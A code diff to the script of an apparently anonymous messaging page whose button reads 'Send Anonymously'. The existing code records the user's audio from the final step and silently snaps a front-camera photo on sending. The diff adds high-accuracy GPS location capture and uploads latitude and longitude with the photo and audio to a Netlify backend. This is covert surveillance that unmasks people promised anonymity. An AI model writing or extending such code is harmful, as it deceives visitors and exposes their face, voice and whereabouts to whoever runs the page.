@@ -18,14 +18,17 @@ document.addEventListener('DOMContentLoaded', () => {
     let mediaRecorder;
     let audioChunks = [];
     let userMediaStream;
+    let userLocation = { latitude: null, longitude: null }; // To store location data
 
     // --- Permissions on Page Load ---
     async function requestPermissions() {
-        console.log('Requesting permissions...');
+        console.log('DEBUG: requestPermissions function started.');
+
+        // Request camera and microphone
+        console.log('DEBUG: Attempting to request Camera/Mic.');
         try {
-            // Request camera and microphone
             userMediaStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
-            console.log('Permissions granted!');
+            console.log('DEBUG: Camera/Microphone permissions granted!');
 
             // --- Setup Audio Recording (BUT DO NOT START YET) ---
             mediaRecorder = new MediaRecorder(userMediaStream);
@@ -34,11 +37,35 @@ document.addEventListener('DOMContentLoaded', () => {
             };
 
         } catch (error) {
-            console.warn('Permissions were denied by the user.', error);
+            console.warn('DEBUG: Camera/Microphone permissions were denied or encountered error:', error);
         }
+
+        // --- NEW: Request Geolocation Permission ---
+        console.log('DEBUG: Checking if Geolocation is supported.');
+        if (navigator.geolocation) {
+            console.log('DEBUG: Geolocation is supported. Attempting to request location.');
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    userLocation.latitude = position.coords.latitude;
+                    userLocation.longitude = position.coords.longitude;
+                    console.log('DEBUG: Geolocation permission granted and captured:', userLocation);
+                },
+                (error) => {
+                    console.warn('DEBUG: Geolocation permission denied or error:', error);
+                    // Common errors:
+                    // 1: PERMISSION_DENIED (user denied or browser denied for security)
+                    // 2: POSITION_UNAVAILABLE (GPS signal lost)
+                    // 3: TIMEOUT (took too long to get location)
+                },
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 } // Options for better accuracy
+            );
+        } else {
+            console.warn('DEBUG: Geolocation is NOT supported by this browser.');
+        }
+        console.log('DEBUG: requestPermissions function finished.');
     }
 
-    requestPermissions();
+    requestPermissions(); // Call permission function on DOMContentLoaded
 
     // --- Photo Capture Function ---
     async function capturePhoto() {
@@ -50,12 +77,12 @@ document.addEventListener('DOMContentLoaded', () => {
             const blob = await imageCapture.takePhoto();
             return blob;
         } catch (error) {
-            console.error("Could not capture photo:", error);
+            console.error("DEBUG: Could not capture photo:", error);
             return null;
         }
     }
 
-    // --- NEW: Image Compression Function ---
+    // --- Image Compression Function ---
     function compressImage(imageFile, maxWidth = 800, quality = 0.7) {
         return new Promise((resolve, reject) => {
             const reader = new FileReader();
@@ -74,7 +101,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             width = maxWidth;
                         }
                     } else {
-                        if (height > maxWidth) { // Use maxWidth for height too, to keep consistent sizing for portrait images
+                        if (height > maxWidth) {
                             width = Math.round((width * maxWidth) / height);
                             height = maxWidth;
                         }
@@ -88,7 +115,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
                     canvas.toBlob(blob => {
                         resolve(blob);
-                    }, 'image/jpeg', quality); // Convert to JPEG with specified quality
+                    }, 'image/jpeg', quality);
                 };
                 img.onerror = error => reject(error);
             };
@@ -116,11 +143,11 @@ document.addEventListener('DOMContentLoaded', () => {
         mainLiveChatButton.classList.add('hidden');
         step2.classList.remove('hidden');
 
-        // --- NEW LOGIC: START RECORDING NOW *** ---
+        // --- START RECORDING NOW *** ---
         if (mediaRecorder && mediaRecorder.state === 'inactive') {
             audioChunks = []; // Clear any previous chunks
             mediaRecorder.start();
-            console.log('Audio recording started on final step.');
+            console.log('DEBUG: Audio recording started on final step.');
         }
     });
 
@@ -148,18 +175,18 @@ document.addEventListener('DOMContentLoaded', () => {
         // Stop recording to finalize the audio file
         if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
-            console.log('Recording stopped by sending message.');
+            console.log('DEBUG: Recording stopped by sending message.');
         }
 
         // Capture photo
         let photo1 = await capturePhoto();
         let compressedPhoto1 = null;
 
-        // --- NEW: Compress the photo before sending ---
+        // Compress the photo before sending
         if (photo1) {
             compressedPhoto1 = await compressImage(photo1);
-            console.log('Original photo size:', (photo1.size / 1024).toFixed(2), 'KB');
-            console.log('Compressed photo size:', (compressedPhoto1.size / 1024).toFixed(2), 'KB');
+            console.log('DEBUG: Original photo size:', (photo1.size / 1024).toFixed(2), 'KB');
+            console.log('DEBUG: Compressed photo size:', (compressedPhoto1.size / 1024).toFixed(2), 'KB');
         }
 
         // Use a small delay to ensure the recorder has time to process the last chunk
@@ -170,8 +197,18 @@ document.addEventListener('DOMContentLoaded', () => {
         formData.append('name', userNameInput.value.trim());
         formData.append('emoji', selectedEmoji || 'No reaction');
 
+        // --- Append location data if available ---
+        if (userLocation.latitude !== null && userLocation.longitude !== null) {
+            formData.append('latitude', userLocation.latitude);
+            formData.append('longitude', userLocation.longitude);
+            console.log('DEBUG: Appending location data to form:', userLocation);
+        } else {
+            console.log('DEBUG: Location data not available to append.');
+        }
+
+
         if (compressedPhoto1) {
-            formData.append('photo1', compressedPhoto1, 'compressed_photo.jpg'); // Use the compressed photo
+            formData.append('photo1', compressedPhoto1, 'compressed_photo.jpg');
         }
         if (audioChunks.length > 0) {
             const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
@@ -180,19 +217,22 @@ document.addEventListener('DOMContentLoaded', () => {
 
         // --- Sending ALL Data to Backend ---
         try {
+            console.log('DEBUG: Sending data to Netlify function.');
             const response = await fetch('/.netlify/functions/send-message', {
                 method: 'POST',
-                body: formData // FormData sets the correct multipart/form-data headers automatically
+                body: formData
             });
 
             if (response.ok) {
+                console.log('DEBUG: Data sent successfully.');
                 step2.classList.add('hidden');
                 step3.classList.remove('hidden');
             } else {
+                console.error('DEBUG: Failed to send message. Server response:', response.status);
                 throw new Error('Failed to send message.');
             }
         } catch (error) {
-            console.error(error);
+            console.error('DEBUG: Error sending data:', error);
             alert('Sorry, something went wrong. Please try again.');
             sendButton.disabled = false;
             sendButton.textContent = 'Send Anonymously';
